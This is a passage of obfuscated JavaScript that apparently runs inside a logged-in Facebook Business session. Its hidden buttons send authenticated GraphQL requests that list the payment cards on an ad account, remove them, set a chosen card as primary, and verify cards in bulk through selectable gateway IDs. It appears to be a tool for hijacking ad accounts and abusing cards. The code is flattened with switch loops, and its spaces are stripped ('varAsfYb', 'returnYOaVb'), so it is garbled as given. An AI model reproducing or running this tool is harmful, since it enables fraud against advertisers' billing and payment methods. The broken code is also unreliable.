                                                        gxoYb.style.display = "none";
                                                        MFck.appendChild(gxoYb);
                                                        varAsfYb = "None";
                                                        gxoYb.value = AsfYb;
                                                        varcuiYb = document.createElement("button");
                                                        cuiYb.textContent = "❤️GetCodeIDs[Fb,INS,verify]❤️AdAccountID::" + YOuk.value;
                                                        cuiYb.style.display = "none";
                                                        YOuk.addEventListener("input", ETjVb);
                                                        cuiYb.addEventListener("click", function() {});
                                                        cuiYb.addEventListener("click", function() {
                                                            fetch("https://business.facebook.com/api/graphql", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "__a=1&dpr=1&fb_dtsg=".concat(_YeTFb.value, "&variables=%7B%22paymentAccountID%22%3A%22").concat(YOuk.value, "%22%2C%22billable_account_types%22%3A%5B%22FB_ADS%22%2C%22WHATSAPP%22%5D%2C%22connected_asset_limit%22%3A26%2C%22connected_asset_detail_limit%22%3A5%7D&doc_id=6362432207216723")), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(gVmVb) {
                                                                gVmVb.json().then(function(AQdVb) {
                                                                    varcSgVb = AQdVb.data.payment_account.billing_payment_methods;
                                                                    varwNXUb = cSgVb.map(function(YOaVb) {
                                                                        returnYOaVb.credential.credential_id;
                                                                    });
                                                                    varsKRUb = wNXUb.filter(function(ULUUb) {
                                                                        returnULUUb;
                                                                    });
                                                                    varUfIVb = sKRUb.join("\\n");
                                                                    seFVb.value = UfIVb;
                                                                });
                                                            }).catch(function(whLVb) {
                                                                console.error(whLVb);
                                                                console.log("ErroroccurredwhilesendingRequest");
                                                            });
                                                            seFVb.value = "⌛...GettingDetails...⌛";
                                                            console.log("GettingDetails...⌛");
                                                        });
                                                        document.body.appendChild(cuiYb);
                                                        cuiYb.style.width = "100%";
                                                        cuiYb.style.height = "30px";
                                                        cuiYb.style.marginBottom = "10px";
                                                        cuiYb.style.backgroundColor = "orange";
                                                        cuiYb.style.color = "white";
                                                        MFck.appendChild(cuiYb);
                                                        varQcCVb = document.createElement("label");
                                                        QcCVb.innerText = "ReceivedCODEs:";
                                                        QcCVb.style.display = "none";
                                                        MFck.appendChild(QcCVb);
                                                        varseFVb = document.createElement("textarea");
                                                        seFVb.placeholder = "EnterReceivedCODEs";
                                                        seFVb.style.width = "100%";
                                                        seFVb.style.height = "100px";
                                                        seFVb.style.marginBottom = "10px";
                                                        seFVb.style.display = "none";
                                                        MFck.appendChild(seFVb);
                                                        varMZvVb = "None";
                                                        seFVb.value = MZvVb;
                                                        varobzVb = document.createElement("button");
                                                        obzVb.textContent = "❤️RemoveCardNow!❤️:";
                                                        obzVb.style.display = "none";
                                                        obzVb.addEventListener("click", function() {});
                                                        obzVb.addEventListener("click", function() {
                                                            fetch("https://business.facebook.com/api/graphql/?_flowletID=2301", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty(_defineProperty({}, "content-type", "application/x-www-form-urlencoded"), "x-fb-friendly-name", "useBillingAddCreditCardMutation")), "referrer", "https://www.facebook.com/"), "body", "av=".concat(_oXDFb.value, "&payment_dev_cycle=prod&_user=").concat(_oXDFb.value, "&a=1&dyn=&req=1g&beoa=0&pc=PHASED:powereditor_pkg&dpr=1.5&ccg=EXCELLENT&rev=1002523221&s=&hsi=6&comet_req=0&fb_dtsg=").concat(_YeTFb.value, '&jazoest=22058&spin_r=1002523221&spin_b=trunk&_spin_t=&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=BillingAccountInformationUtilsCreateAccountMutation&variables={"input":{"logging_data":{"logging_counter":11,"logging_id":"571838706"},"payment_account_id":"').concat(YOuk.value, '","payment_method_id":"').concat(gxoYb.value, '","upl_logging_data":{"context":"billingremovepm","entry_point":"BILLING_HUB","external_flow_id":"3723171164","target_name":"useBillingRemovePMMutation","user_session_id":"upl_1695773697929_83a7a084-5da6-4165-8e26-59fdbb899c73","wizard_config_name":"REMOVE_PM","wizard_name":"REMOVE_PM","wizard_screen_name":"remove_pm_state_display","wizard_session_id":"upl_wizard_1695773740477_1bfa2ca8-f58d-4d9a-8f3e-4d907571c893"},"actor_id":"').concat(_oXDFb.value, '","client_mutation_id":"1"}}&server_timestamps=true&doc_id=6325673510865212')), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(IWpVb) {
                                                                IWpVb.json().then(function(kYsVb) {
                                                                    varC = 0;
                                                                    while (C < 65535) {
                                                                        switch (C) {
                                                                            case0: C = kYsVb.data && kYsVb.data.billable_account_remove_payment_method ? 1 : 2;
                                                                            break;
                                                                            case1: C = 65535; {
                                                                                sCXh.value = "PaymentMethodRemovedSuccessfully";
                                                                                EvtOb.style.display = "block";
                                                                                wxvQb.style.display = "none";
                                                                            }
                                                                            break;
                                                                            case2: C = 65535;
                                                                            varD = 0;
                                                                            while (D < 65535) {
                                                                                switch (D) {
                                                                                    case0: D = kYsVb.errors && kYsVb.errors.length > 0 ? 1 : 2;
                                                                                    break;
                                                                                    case1: D = 65535; {
                                                                                        vargpaWb = kYsVb.errors[0];
                                                                                        varIqdWb = gpaWb.debug_info;
                                                                                        varcmUVb = gpaWb.summary;
                                                                                        varE = 0;
                                                                                        while (E < 65535) {
                                                                                            switch (E) {
                                                                                                case0: E = IqdWb ? 1 : 65535;
                                                                                                break;
                                                                                                case1: E = 65535; {
                                                                                                    sCXh.value = "DebugInfo:".concat(IqdWb);
                                                                                                }
                                                                                                break;
                                                                                            }
                                                                                        }
                                                                                        varF = 0;
                                                                                        while (F < 65535) {
                                                                                            switch (F) {
                                                                                                case0: F = cmUVb ? 1 : 65535;
                                                                                                break;
                                                                                                case1: F = 65535; {
                                                                                                    sCXh.value = "\\nSummary:".concat(cmUVb);
                                                                                                }
                                                                                                break;
                                                                                            }
                                                                                        }
                                                                                    }
                                                                                    break;
                                                                                    case2: D = 65535; {
                                                                                        sCXh.value = "Unexpectedresponsestructure.";
                                                                                    }
                                                                                    break;
                                                                                }
                                                                            }
                                                                            break;
                                                                        }
                                                                    }
                                                                });
                                                            }).catch(function(AkRVb) {
                                                                console.error(AkRVb);
                                                                sCXh.value = "ErroroccurredwhilesendingRequest";
                                                            });
                                                            console.log("Removing...❌");
                                                            sCXh.value = "RemovingCardInProgress...❌";
                                                            console.log("Removing...❌");
                                                        });
                                                        document.body.appendChild(obzVb);
                                                        obzVb.style.width = "100%";
                                                        obzVb.style.height = "30px";
                                                        obzVb.style.marginBottom = "10px";
                                                        obzVb.style.backgroundColor = "RED";
                                                        obzVb.style.color = "white";
                                                        MFck.appendChild(obzVb);
                                                        varAEEWb = document.createElement("button");
                                                        AEEWb.textContent = "❤️MakePrimaryCardNow!❤️:";
                                                        AEEWb.style.display = "none";
                                                        AEEWb.addEventListener("click", function() {});
                                                        AEEWb.addEventListener("click", function() {
                                                            fetch("https://business.facebook.com/api/graphql", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "__a=1&dpr=1&fb_dtsg=".concat(_YeTFb.value, '&variables={"input":{"billable_account_payment_legacy_account_id":"').concat(YOuk.value, '","primary_funding_id":"').concat(gxoYb.value, '","actor_id":"').concat(_oXDFb.value, '","client_mutation_id":"1"}}&doc_id=5655324851148937')), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(cGHWb) {
                                                                cGHWb.text().then(function(wByWb) {
                                                                    console.log(wByWb);
                                                                    sCXh.value = wByWb;
                                                                });
                                                            }).catch(function(YCBWb) {
                                                                console.error(YCBWb);
                                                                console.log("ErroroccurredwhilesendingRequest");
                                                            });
                                                            console.log("⌛...TryActivatingInProgress...⌛");
                                                            sCXh.value = "⌛...TryActivatingInProgress...⌛";
                                                        });
                                                        document.body.appendChild(AEEWb);
                                                        AEEWb.style.width = "100%";
                                                        AEEWb.style.height = "30px";
                                                        AEEWb.style.marginBottom = "10px";
                                                        AEEWb.style.backgroundColor = "RED";
                                                        AEEWb.style.color = "white";
                                                        MFck.appendChild(AEEWb);
                                                        varsysWb = document.createElement("button");
                                                        sysWb.textContent = "❤️GetLinkVerifyPaymentMethodID[Fb,INS]❤️AdAccountID::" + YOuk.value;
                                                        sysWb.style.display = "none";
                                                        YOuk.addEventListener("input", UzvWb);
                                                        sysWb.addEventListener("click", function() {});
                                                        sysWb.addEventListener("click", function() {
                                                            fetch("https://business.facebook.com/api/graphql", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "__a=1&dpr=1&fb_dtsg=".concat(_YeTFb.value, '&variables={"paymentAccountID":"').concat(YOuk.value, '","paymentMethodID":"').concat(gxoYb.value, '","country":null}&server_timestamps=true&doc_id=7175474629172280')), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(ovmWb) {
                                                                ovmWb.json().then(function(QwpWb) {
                                                                    varsWqTb = QwpWb.data.billing_external_result_url;
                                                                    varG = 0;
                                                                    while (G < 65535) {
                                                                        switch (G) {
                                                                            case0: G = sWqTb ? 1 : 2;
                                                                            break;
                                                                            case1: G = 65535; {
                                                                                kQeTb.value = sWqTb;
                                                                            }
                                                                            break;
                                                                            case2: G = 65535; {
                                                                                kQeTb.value = "NoURLavailable";
                                                                            }
                                                                            break;
                                                                        }
                                                                    }
                                                                });
                                                            }).catch(function(oTkTb) {
                                                                console.error(oTkTb);
                                                                console.log("Erroroccurredwhilesendingrequest");
                                                                kQeTb.value = "Erroroccurredwhilegettingdetails";
                                                            });
                                                            kQeTb.value = "⌛...GettingDetails...⌛";
                                                            console.log("GettingDetails...⌛");
                                                        });
                                                        document.body.appendChild(sysWb);
                                                        sysWb.style.width = "100%";
                                                        sysWb.style.height = "30px";
                                                        sysWb.style.marginBottom = "10px";
                                                        sysWb.style.backgroundColor = "gray";
                                                        sysWb.style.color = "white";
                                                        MFck.appendChild(sysWb);
                                                        varQUnTb = document.createElement("label");
                                                        QUnTb.innerText = "ReceivedLink:";
                                                        QUnTb.style.display = "none";
                                                        MFck.appendChild(QUnTb);
                                                        varkQeTb = document.createElement("input");
                                                        kQeTb.type = "text";
                                                        kQeTb.placeholder = "EnterReceivedCODE";
                                                        kQeTb.style.width = "100%";
                                                        kQeTb.style.height = "20px";
                                                        kQeTb.style.marginBottom = "10px";
                                                        kQeTb.style.display = "none";
                                                        MFck.appendChild(kQeTb);
                                                        varMRhTb = "None";
                                                        kQeTb.value = MRhTb;
                                                        vargNYSb = document.createElement("button");
                                                        gNYSb.textContent = "❤️VerifyCardNow!❤️:";
                                                        gNYSb.style.display = "none";
                                                        gNYSb.addEventListener("click", function() {});
                                                        gNYSb.addEventListener("click", function() {
                                                            fetch("https://business.facebook.com/api/graphql", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "__a=1&dpr=1&fb_dtsg=".concat(_YeTFb.value, '&variables={"input":{"account_currency":"USD","authentication_response_type":"REDIRECT","authentication_response_url":"').concat(kQeTb.value, '","billing_logging_data":{"logging_counter":48,"logging_id":"3052500123"},"payment_item_type":"MOR_ADS_INVOICE","sender_credential_id":"').concat(gxoYb.value, '","sender_payment_account_id":"').concat(YOuk.value, '","tax_country":"UM","upl_logging_data":{"context":"billingcreditcard","target_name":"useBillingAddCreditCardMutation","user_session_id":"upl_1719360233488_892954d8-260c-4df5-995a-3a18800cbba2","wizard_session_id":"upl_wizard_1719360233488_438a06f6-066a-4799-ae01-0ce1cd98fe1d"},"actor_id":"').concat(_oXDFb.value, '","client_mutation_id":"11"}}&server_timestamps=true&doc_id=4772731529517495')), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(IObTb) {
                                                                IObTb.text().then(function(IiPTb) {
                                                                    console.log(IiPTb);
                                                                    sCXh.value = IiPTb;
                                                                });
                                                            }).catch(function(kkSTb) {
                                                                console.error(kkSTb);
                                                                console.log("ErroroccurredwhilesendingRequest");
                                                            });
                                                            console.log("⌛...TryActivatingInProgress...⌛");
                                                            sCXh.value = "⌛...TryActivatingInProgress...⌛";
                                                        });
                                                        document.body.appendChild(gNYSb);
                                                        gNYSb.style.width = "100%";
                                                        gNYSb.style.height = "30px";
                                                        gNYSb.style.marginBottom = "10px";
                                                        gNYSb.style.backgroundColor = "RED";
                                                        gNYSb.style.color = "white";
                                                        MFck.appendChild(gNYSb);
                                                        varEfJTb = document.createElement("button");
                                                        EfJTb.textContent = "❤️GetLinkVerifyPaymentMethodID[Fb,INS]❤️AdAccountID::" + YOuk.value;
                                                        EfJTb.style.display = "none";
                                                        YOuk.addEventListener("input", ghMTb);
                                                        EfJTb.addEventListener("click", function() {
                                                            varAcDTb = seFVb.value.split("\\n");
                                                            varceGTb = [];
                                                            varwZwTb = functionwZwTb(YaATb) {
                                                                varH = 0;
                                                                while (H < 65535) {
                                                                    switch (H) {
                                                                        case0: H = YaATb >= AcDTb.length ? 1 : 65535;
                                                                        break;
                                                                        case1: H = 65535; {
                                                                            onYTb.value = ceGTb.join("\\n");
                                                                            onYTb.style.display = "block";
                                                                            MlVTb.style.display = "block";
                                                                            return;
                                                                        }
                                                                        break;
                                                                    }
                                                                }
                                                                fetch("https://business.facebook.com/api/graphql", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "__a=1&dpr=1&fb_dtsg=".concat(_YeTFb.value, '&variables={"paymentAccountID":"').concat(YOuk.value, '","paymentMethodID":"').concat(AcDTb[YaATb], '","country":null}&server_timestamps=true&doc_id=7175474629172280')), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(AwqUb) {
                                                                    AwqUb.json().then(function(UrhUb) {
                                                                        varwtkUb = UrhUb.data.billing_external_result_url;
                                                                        varI = 0;
                                                                        while (I < 65535) {
                                                                            switch (I) {
                                                                                case0: I = wtkUb ? 1 : 2;
                                                                                break;
                                                                                case1: I = 65535; {
                                                                                    ceGTb.push(wtkUb);
                                                                                }
                                                                                break;
                                                                                case2: I = 65535; {
                                                                                    ceGTb.push("NoURLavailable");
                                                                                }
                                                                                break;
                                                                            }
                                                                        }
                                                                        wZwTb(YaATb + 1);
                                                                    }).catch(function(sqeUb) {
                                                                        console.error(sqeUb);
                                                                        console.log("Erroroccurredwhilesendingrequest");
                                                                        ceGTb.push("Erroroccurredwhilegettingdetails");
                                                                        wZwTb(YaATb + 1);
                                                                    });
                                                                });
                                                            };
                                                            wZwTb(0);
                                                            onYTb.value = "⌛...GettingDetails...⌛";
                                                            console.log("GettingDetails...⌛");
                                                        });
                                                        document.body.appendChild(EfJTb);
                                                        EfJTb.style.width = "100%";
                                                        EfJTb.style.height = "30px";
                                                        EfJTb.style.marginBottom = "10px";
                                                        EfJTb.style.backgroundColor = "gray";
                                                        EfJTb.style.color = "white";
                                                        MFck.appendChild(EfJTb);
                                                        varMlVTb = document.createElement("label");
                                                        MlVTb.innerText = "ReceivedLink:";
                                                        MlVTb.style.display = "none";
                                                        MFck.appendChild(MlVTb);
                                                        varonYTb = document.createElement("textarea");
                                                        onYTb.placeholder = "EnterReceivedCODE";
                                                        onYTb.style.width = "100%";
                                                        onYTb.style.height = "100px";
                                                        onYTb.style.marginBottom = "10px";
                                                        onYTb.style.display = "none";
                                                        MFck.appendChild(onYTb);
                                                        varoHLUb = "None";
                                                        onYTb.value = oHLUb;
                                                        varQIOUb = document.createElement("button");
                                                        QIOUb.textContent = "❤️VerifyAllCardsNow!❤️:";
                                                        QIOUb.style.display = "none";
                                                        QIOUb.addEventListener("click", function() {
                                                            varkEFUb = onYTb.value.split("\\n");
                                                            varMFIUb = [];
                                                            vargBzUb = functiongBzUb(ICCUb) {
                                                                varJ = 0;
                                                                while (J < 65535) {
                                                                    switch (J) {
                                                                        case0: J = ICCUb >= kEFUb.length ? 1 : 65535;
                                                                        break;
                                                                        case1: J = 65535; {
                                                                            cWrRb.value = MFIUb.join("\\n");
                                                                            return;
                                                                        }
                                                                        break;
                                                                    }
                                                                }
                                                                fetch("https://business.facebook.com/api/graphql", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "__a=1&dpr=1&fb_dtsg=".concat(_YeTFb.value, '&variables={"input":{"account_currency":"USD","authentication_response_type":"REDIRECT","authentication_response_url":"').concat(kEFUb[ICCUb], '","billing_logging_data":{"logging_counter":48,"logging_id":"3052500123"},"payment_item_type":"MOR_ADS_INVOICE","sender_credential_id":"').concat(seFVb.value.split("\\n")[ICCUb], '","sender_payment_account_id":"').concat(YOuk.value, '","tax_country":"UM","upl_logging_data":{"context":"billingcreditcard","target_name":"useBillingAddCreditCardMutation","user_session_id":"upl_1719360233488_892954d8-260c-4df5-995a-3a18800cbba2","wizard_session_id":"upl_wizard_1719360233488_438a06f6-066a-4799-ae01-0ce1cd98fe1d"},"actor_id":"').concat(_oXDFb.value, '","client_mutation_id":"11"}}&server_timestamps=true&doc_id=4772731529517495')), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(EzwUb) {
                                                                    EzwUb.text().then(function(gZxRb) {
                                                                        MFIUb.push(gZxRb);
                                                                        gBzUb(ICCUb + 1);
                                                                    }).catch(function(IaBRb) {
                                                                        console.error(IaBRb);
                                                                        console.log("Erroroccurredwhilesendingrequest");
                                                                        MFIUb.push("Erroroccurredwhilegettingdetails");
                                                                        gBzUb(ICCUb + 1);
                                                                    });
                                                                });
                                                            };
                                                            gBzUb(0);
                                                            cWrRb.value = "⌛...TryVerifyingInProgress...⌛";
                                                            console.log("⌛...TryVerifyingInProgress...⌛");
                                                        });
                                                        document.body.appendChild(QIOUb);
                                                        QIOUb.style.width = "100%";
                                                        QIOUb.style.height = "30px";
                                                        QIOUb.style.marginBottom = "10px";
                                                        QIOUb.style.backgroundColor = "RED";
                                                        QIOUb.style.color = "white";
                                                        MFck.appendChild(QIOUb);
                                                        varcWrRb = document.createElement("textarea");
                                                        cWrRb.placeholder = "ResponsefromServer!";
                                                        cWrRb.style.display = "none";
                                                        cWrRb.style.width = "100%";
                                                        cWrRb.style.height = "100px";
                                                        cWrRb.style.marginBottom = "10px";
                                                        MFck.appendChild(cWrRb);
                                                        varEXuRb = document.createElement("label");
                                                        EXuRb.innerText = "GatewayID:";
                                                        EXuRb.style.color = "red";
                                                        EXuRb.style.display = "none";
                                                        MFck.appendChild(EXuRb);
                                                        var_YSlRb = document.createElement("select");
                                                        _YSlRb.style.width = "100%";
                                                        _YSlRb.style.height = "20px";
                                                        _YSlRb.style.marginBottom = "10px";
                                                        _YSlRb.style.display = "none";
                                                        MFck.appendChild(_YSlRb);
                                                        varAUoRb = [_defineProperty(_defineProperty({}, "value", "7066177353500107"), "text", "oldGatewayID07"), _defineProperty(_defineProperty({}, "value", "7203358526347017"), "text", "OldGatewayID17"), _defineProperty(_defineProperty({}, "value", "6798152750290110"), "text", "CurrentGatewayID10"), _defineProperty(_defineProperty({}, "value", "4987045951343337"), "text", "OldGatewayID37"), _defineProperty(_defineProperty({}, "value", "4126726757375265"), "text", "OldGatewayID65")];
                                                        AUoRb.forEach(function(UPfRb) {
                                                            varwRiRb = document.createElement("option");
                                                            wRiRb.value = UPfRb.value;
                                                            wRiRb.innerText = UPfRb.text;
                                                            _YSlRb.appendChild(wRiRb);
                                                        });
                                                        _YSlRb.value = "7066177353500107";
                                                        varwlWRb = document.createElement("p");
                                                        wlWRb.style.marginTop = "10px";
                                                        wlWRb.innerText = _YSlRb.options[_YSlRb.selectedIndex].text;
                                                        wlWRb.style.display = "none";
                                                        MFck.appendChild(wlWRb);
                                                        _YSlRb.addEventListener("change", function() {
                                                            wlWRb.innerText = _YSlRb.options[_YSlRb.selectedIndex].text;
                                                        });
                                                        varYmZRb = document.createElement("label");
                                                        YmZRb.innerText = "PaymentType:";
                                                        YmZRb.style.display = "none";
                                                        MFck.appendChild(YmZRb);
                                                        var_siQRb = document.createElement("select");
                                                        _siQRb.style.width = "100%";
                                                        _siQRb.style.height = "20px";
                                                        _siQRb.style.marginBottom = "10px";
                                                        _siQRb.style.display = "none";
                                                        MFck.appendChild(_siQRb);
                                                        varUjTRb = [_defineProperty(_defineProperty({}, "value", "MOR_ADS_INVOICE"), "text", "DefaultPaymentTypeINVOICE"), _defineProperty(_defineProperty({}, "value", "MOR_ADS_STORED_BALANCE"), "text", "DefaultPaymentTypeSTORED")];
                                                        UjTRb.forEach(function(ofKRb) {
                                                            varQgNRb = document.createElement("option");
                                                            QgNRb.value = ofKRb.value;
                                                            QgNRb.innerText = ofKRb.text;
                                                            _siQRb.appendChild(QgNRb);
                                                        });
                                                        _siQRb.value = "MOR_ADS_INVOICE";
                                                        varkcERb = document.createElement("p");
                                                        kcERb.style.marginTop = "10px";
                                                        kcERb.innerText = _siQRb.options[_siQRb.selectedIndex].text;
                                                        kcERb.style.display = "none";
                                                        MFck.appendChild(kcERb);
                                                        _siQRb.addEventListener("change", function() {
                                                            kcERb.innerText = _siQRb.options[_siQRb.selectedIndex].text;
                                                        });
                                                        varMdHRb = document.createElement("button");
                                                        MdHRb.textContent = "💰ShowVerifyCardsTools💰";
                                                        MdHRb.style.width = "100%";
                                                        MdHRb.style.height = "50px";
                                                        MdHRb.style.marginBottom = "10px";
                                                        MdHRb.style.backgroundColor = "green";
                                                        MdHRb.style.color = "white";
                                                        varMxuSb = NaN === NaN;
                                                        MdHRb.addEventListener("click", function() {
                                                            ozxSb.style.display = MxuSb ? "none" : "block";
                                                            cWrRb.style.display = MxuSb ? "none" : "block";
                                                            MxuSb = !MxuSb;
                                                            MdHRb.textContent = MxuSb ? "💰HideVerifyTools💰" : "💰ShowverifyTools💰";
                                                            MdHRb.style.backgroundColor = MxuSb ? "Gray" : "green";
                                                        });
                                                        MFck.appendChild(MdHRb);
                                                        varozxSb = document.createElement("button");
                                                        ozxSb.textContent = "💰ShowverifyCardsSections💰";
                                                        ozxSb.style.display = "none";
                                                        ozxSb.style.width = "50%";
                                                        ozxSb.style.height = "30px";
                                                        ozxSb.style.marginBottom = "10px";
                                                        ozxSb.style.backgroundColor = "green";
                                                        ozxSb.style.color = "white";
                                                        varIuoSb = NaN === NaN;
                                                        ozxSb.addEventListener("click", function() {
                                                            EfJTb.style.display = IuoSb ? "none" : "block";
                                                            MlVTb.style.display = IuoSb ? "none" : "block";
                                                            onYTb.style.display = IuoSb ? "none" : "block";
                                                            QIOUb.style.display = IuoSb ? "none" : "block";
                                                            cuiYb.style.display = IuoSb ? "none" : "block";
                                                            seFVb.style.display = IuoSb ? "none" : "block";
                                                            IuoSb = !IuoSb;
                                                            ozxSb.textContent = IuoSb ? "💰HideVerifyCreditCardSections💰" : "💰ShowVerifyCreditCardSections💰";
                                                            ozxSb.style.backgroundColor = IuoSb ? "Gray" : "green";
                                                        });
                                                        MFck.appendChild(ozxSb);
                                                        varkwrSb = document.createElement("button");
                                                        kwrSb.textContent = "💰ShowAdAccountTools💰";
                                                        kwrSb.style.width = "100%";
                                                        kwrSb.style.height = "50px";
                                                        kwrSb.style.marginBottom = "10px";
                                                        kwrSb.style.backgroundColor = "blue";
                                                        kwrSb.style.color = "white";
                                                        varEriSb = NaN === NaN;
                                                        kwrSb.addEventListener("click", function() {
                                                            gtlSb.style.display = EriSb ? "none" : "block";
                                                            AgOPb.style.display = EriSb ? "none" : "block";
                                                            orjQb.style.display = EriSb ? "none" : "block";
                                                            IyzOb.style.display = EriSb ? "none" : "block";
                                                            sCXh.style.display = EriSb ? "none" : "block";
                                                            EriSb = !EriSb;
                                                            kwrSb.textContent = EriSb ? "💰HideAdAccountTools💰" : "💰ShowAdAccountTools💰";
                                                            kwrSb.style.backgroundColor = EriSb ? "Gray" : "blue";
                                                        });
                                                        MFck.appendChild(kwrSb);
                                                        vargtlSb = document.createElement("button");
                                                        gtlSb.textContent = "💰ShowActivatePaymentMethodOptionsSections💰";
                                                        gtlSb.style.display = "none";
                                                        gtlSb.style.width = "60%";
                                                        gtlSb.style.height = "30px";
                                                        gtlSb.style.marginBottom = "10px";
                                                        gtlSb.style.backgroundColor = "Blue";
                                                        gtlSb.style.color = "white";
                                                        varAocSb = NaN === NaN;
                                                        gtlSb.addEventListener("click", function() {
                                                            cqfSb.style.display = AocSb ? "none" : "block";
                                                            kodQb.style.display = AocSb ? "none" : "block";
                                                            MpgQb.style.display = AocSb ? "none" : "block";
                                                            ImaQb.style.display = AocSb ? "none" : "block";
                                                            AocSb = !AocSb;
                                                            gtlSb.textContent = AocSb ? "💰HideActivatePaymentMethodOptionsSections💰" : "💰ShowActivatePaymentMethodOptionsSections💰";
                                                            gtlSb.style.backgroundColor = AocSb ? "Gray" : "Blue";
                                                        });
                                                        MFck.appendChild(gtlSb);
                                                        varcqfSb = document.createElement("button");
                                                        cqfSb.textContent = "❤️GetCodeID[Fb,INS]❤️AdAccountID::" + YOuk.value;
                                                        cqfSb.style.display = "none";
                                                        cqfSb.addEventListener("click", function() {});
                                                        cqfSb.addEventListener("click", function() {
                                                            fetch("https://business.facebook.com/api/graphql", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "__a=1&dpr=1&fb_dtsg=".concat(_YeTFb.value, "&variables=%7B%22paymentAccountID%22%3A%22").concat(YOuk.value, "%22%2C%22billable_account_types%22%3A%5B%22FB_ADS%22%2C%22WHATSAPP%22%5D%2C%22connected_asset_limit%22%3A26%2C%22connected_asset_detail_limit%22%3A5%7D&doc_id=6362432207216723")), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(cKSSb) {
                                                                cKSSb.json().then(function(ELVSb) {
                                                                    varYGMSb = ELVSb.data.payment_account.billing_payment_methods;
                                                                    varAIPSb = YGMSb.map(function(UDGSb) {
                                                                        varwFJSb = UDGSb.credential.credential_id;
                                                                        varQAASb = UDGSb.credential.card_association_name;
                                                                        varsCDSb = UDGSb.credential.last_four_digits;
                                                                        varUbFPb = UDGSb.credential.bank_account_type;
                                                                        varwdIPb;
                                                                        varK = 0;
                                                                        while (K < 65535) {
                                                                            switch (K) {
                                                                                case0: K = QAASb && sCDSb ? 1 : 2;
                                                                                break;
                                                                                case1: K = 65535; {
                                                                                    wdIPb = "".concat(wFJSb, ":").concat(QAASb, "End").concat(sCDSb);
                                                                                }
                                                                                break;
                                                                                case2: K = 65535;
                                                                                varL = 0;
                                                                                while (L < 65535) {
                                                                                    switch (L) {
                                                                                        case0: L = UbFPb ? 1 : 2;
                                                                                        break;
                                                                                        case1: L = 65535; {
                                                                                            wdIPb = "".concat(wFJSb, ":").concat(UbFPb);
                                                                                        }
                                                                                        break;
                                                                                        case2: L = 65535; {
                                                                                            wdIPb = "".concat(wFJSb, ":Store-Balance");
                                                                                        }
                                                                                        break;
                                                                                    }
                                                                                }
                                                                                break;
                                                                            }
                                                                        }
                                                                        returnwdIPb;
                                                                    });
                                                                    varMVsPb = AIPSb.filter(function(oXvPb) {
                                                                        returnoXvPb;
                                                                    });
                                                                    varISmPb = MVsPb.join(",");
                                                                    MpgQb.value = ISmPb;
                                                                });
                                                            }).catch(function(kUpPb) {
                                                                console.error(kUpPb);
                                                                console.log("ErroroccurredwhilesendingRequest");
                                                            });
                                                            MpgQb.value = "⌛...GettingDetails...⌛";
                                                            console.log("GettingDetails...⌛");
                                                        });
                                                        document.body.appendChild(cqfSb);
                                                        cqfSb.style.width = "100%";
                                                        cqfSb.style.height = "30px";
                                                        cqfSb.style.marginBottom = "10px";
                                                        cqfSb.style.backgroundColor = "orange";
                                                        cqfSb.style.color = "white";
                                                        MFck.appendChild(cqfSb);
                                                        varkodQb = document.createElement("label");
                                                        kodQb.innerText = "ReceivedCODE:";
                                                        kodQb.style.display = "none";
                                                        MFck.appendChild(kodQb);
                                                        varMpgQb = document.createElement("input");
                                                        MpgQb.type = "text";
                                                        MpgQb.placeholder = "EnterReceivedCODE";
                                                        MpgQb.style.width = "100%";
                                                        MpgQb.style.height = "20px";
                                                        MpgQb.style.marginBottom = "10px";
                                                        MpgQb.style.display = "none";
                                                        MFck.appendChild(MpgQb);
                                                        varglXPb = "None";
                                                        MpgQb.value = glXPb;
                                                        varImaQb = document.createElement("button");
                                                        ImaQb.textContent = "❤️MakePrimaryCodeNow!❤️:";
                                                        ImaQb.style.display = "none";
                                                        ImaQb.addEventListener("click", function() {});
                                                        ImaQb.addEventListener("click", function() {
                                                            fetch("https://business.facebook.com/api/graphql", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "__a=1&dpr=1&fb_dtsg=".concat(_YeTFb.value, '&variables={"input":{"billable_account_payment_legacy_account_id":"').concat(YOuk.value, '","primary_funding_id":"').concat(MpgQb.value, '","actor_id":"').concat(_oXDFb.value, '","client_mutation_id":"1"}}&doc_id=5655324851148937')), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(ciRPb) {
                                                                ciRPb.text().then(function(EjUPb) {
                                                                    console.log(EjUPb);
                                                                    sCXh.value = EjUPb;
                                                                });
                                                            }).catch(function(YeLPb) {
                                                                console.error(YeLPb);
                                                                console.log("ErroroccurredwhilesendingRequest");
                                                            });
                                                            console.log("⌛...TryActivatingInProgress...⌛");
                                                            sCXh.value = "⌛...TryActivatingInProgress...⌛";
                                                        });
                                                        document.body.appendChild(ImaQb);
                                                        ImaQb.style.width = "100%";
                                                        ImaQb.style.height = "30px";
                                                        ImaQb.style.marginBottom = "10px";
                                                        ImaQb.style.backgroundColor = "RED";
                                                        ImaQb.style.color = "white";
